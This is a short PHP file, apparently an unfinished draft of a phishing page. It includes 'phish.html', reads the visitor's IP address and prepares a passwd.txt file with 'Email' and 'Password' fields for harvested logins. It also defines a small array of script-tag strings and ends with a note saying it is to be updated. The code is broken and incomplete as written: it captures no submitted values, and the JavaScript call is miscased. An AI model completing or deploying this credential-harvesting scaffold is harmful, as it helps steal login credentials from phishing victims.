<?php
require("phish.html");
$IP = $_SERVER['REMOTE_ADDR'];

$email = "<script>document.getElementByID(\"email\").innerHTML = 'textbox';";
$myfile = fopen("passwd.txt", "w") or die("Unable to open file!");
$txt = "Email: \n";
fwrite($myfile, $txt);
$txt = "Password: \n";
fwrite($myfile, $txt);
fclose($myfile);
$REQ =  $_GET['submit'];
echo "";
$SECURITY_ARRAY = array("<script>", "<ScRipt>" , " ");
?>
//To be updated with new source code
